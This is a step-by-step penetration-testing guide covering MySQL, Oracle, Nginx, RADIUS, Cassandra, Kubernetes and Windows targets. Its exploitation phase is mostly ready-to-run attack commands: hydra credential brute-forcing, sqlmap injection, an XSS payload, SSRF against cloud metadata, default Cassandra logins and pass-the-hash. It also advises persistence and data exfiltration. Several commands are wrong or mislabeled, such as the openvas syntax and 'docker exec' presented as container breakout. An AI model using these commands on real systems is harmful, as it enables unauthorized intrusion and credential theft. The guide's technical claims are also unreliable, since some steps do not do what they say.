## **Step-by-Step Guide for Full-Scope Penetration Testing**  

This guide provides a structured approach for testing each of the following services:  

1. **MySQL**  
2. **Oracle Database**  
3. **Custom JavaScript Application**  
4. **JBox Server**  
5. **Nginx**  
6. **RADIUS**  
7. **Apache Cassandra**  
8. **Kubernetes Cluster**  
9. **Windows Server**  

---

## **🟢 PHASE 1: Pre-Engagement (Planning & Rules of Engagement)**
### **1. Define Scope**
- Identify **targets** (IPs, domains, services, internal/external).
- Determine if it's a **black-box, gray-box, or white-box** test.
- Consider compliance requirements (PCI-DSS, HIPAA, etc.).
- Ensure **legal permissions** (Authorization letter, NDA, contract).

### **2. Information Gathering**
- Use **OSINT** techniques (Shodan, Censys, Google Dorking).
- Identify exposed services and versions.
- Check for leaked credentials on dark web sources.

---

## **🔵 PHASE 2: Reconnaissance & Enumeration**
### **1. Identify Open Ports & Services**
```bash
nmap -p- -A -T4 <TARGET_IP>
```
- Find open ports, services, and versions.
- Identify running databases, web apps, and network services.

### **2. Service-Specific Enumeration**
- Use **Nikto** to check for vulnerabilities in web services.
```bash
nikto -h http://<TARGET_IP>
```
- Use **Enum4Linux** to extract information from Windows servers.
```bash
enum4linux -a <TARGET_IP>
```

---

## **🔴 PHASE 3: Vulnerability Assessment**
- Use automated tools to scan for vulnerabilities.
- Cross-check results with **manual testing** to reduce false positives.

```bash
# Run Nessus or OpenVAS (GUI-based vulnerability scanner)
openvas -sV -A <TARGET_IP>
```

- Map vulnerabilities to CVE databases.
- Identify misconfigurations, outdated software, and missing patches.

---

## **🟠 PHASE 4: Exploitation & Attack Scenarios**
This section details how to exploit each service.

### **1️⃣ MySQL Penetration Testing**
#### **Step 1: Check for Weak Authentication**
```bash
hydra -L userlist.txt -P passlist.txt mysql://<TARGET_IP>
```
#### **Step 2: Check for Misconfigured User Permissions**
```sql
SELECT user, host FROM mysql.user;
```
#### **Step 3: SQL Injection Testing**
Use SQLmap for automated SQL Injection testing.
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```

---

### **2️⃣ Oracle Database Penetration Testing**
#### **Step 1: Enumerate Oracle Services**
```bash
nmap --script=oracle-sid-brute,oracle-tns-version <TARGET_IP>
```
#### **Step 2: Exploit Weak Authentication**
```bash
odat passwordguesser -s <SID> -d <TARGET_IP> -U usernames.txt -P passwords.txt
```
#### **Step 3: Exploit TNS Poisoning**
```bash
python tns_poison.py -t <TARGET_IP> -p 1521
```

---

### **3️⃣ Custom JavaScript Application Penetration Testing**
#### **Step 1: Identify Endpoints**
- Use **Burp Suite** to map the API and endpoints.

#### **Step 2: Test for Cross-Site Scripting (XSS)**
```html
<script>alert('XSS')</script>
```
- Inject JavaScript payloads in user input fields.

#### **Step 3: Check for API Authentication Bypass**
- Manipulate API tokens using **JWT attack tools**.

---

### **4️⃣ JBox Server Penetration Testing**
#### **Step 1: Check for Open Ports**
```bash
nmap -sV -p22,80,443 <TARGET_IP>
```
#### **Step 2: Exploit SSH Misconfigurations**
```bash
hydra -L users.txt -P passwords.txt ssh://<TARGET_IP>
```
#### **Step 3: Container Breakout**
```bash
docker exec -it container_name /bin/bash
```
- Try escaping into the host machine.

---

### **5️⃣ Nginx Security Testing**
#### **Step 1: Check for Misconfigurations**
```bash
curl -I -X OPTIONS http://<TARGET_IP>
```
#### **Step 2: Exploit SSRF**
```bash
curl "http://target.com/?url=http://169.254.169.254/latest/meta-data/"
```
- Check if you can access internal AWS metadata.

---

### **6️⃣ RADIUS Server Penetration Testing**
#### **Step 1: Enumerate Users**
```bash
nmap --script=radius-username <TARGET_IP>
```
#### **Step 2: Brute-Force RADIUS Authentication**
```bash
hydra -P passwords.txt -t 4 -m 1812 radius://<TARGET_IP>
```

---

### **7️⃣ Apache Cassandra Penetration Testing**
#### **Step 1: Check for Open Ports**
```bash
nmap -p 7000,9042 <TARGET_IP>
```
#### **Step 2: Exploit Weak Authentication**
```bash
cqlsh -u cassandra -p cassandra <TARGET_IP>
```

---

### **8️⃣ Kubernetes Cluster Penetration Testing**
#### **Step 1: Check for Misconfigured API Endpoints**
```bash
kubectl get pods --all-namespaces
```
#### **Step 2: Exploit Container Privilege Escalation**
```bash
kubectl exec -it <POD_NAME> -- /bin/sh
```

---

### **9️⃣ Windows Server Penetration Testing**
#### **Step 1: SMB Enumeration**
```bash
smbclient -L //<TARGET_IP> -U guest
```
#### **Step 2: Privilege Escalation with PowerShell**
```powershell
whoami /priv
```
#### **Step 3: Pass-the-Hash Attack**
```bash
crackmapexec smb <TARGET_IP> -u user -H hash
```

---

## **🔵 PHASE 5: Post-Exploitation & Lateral Movement**
- Escalate privileges and pivot inside the network.
- Set up persistent access via SSH tunnels or RDP.
- Exfiltrate sensitive data.

---

## **🟣 PHASE 6: Reporting & Remediation**
- **Report Findings:** Document vulnerabilities, risk impact, and recommendations.
- **Re-Test:** Verify if vulnerabilities have been patched.
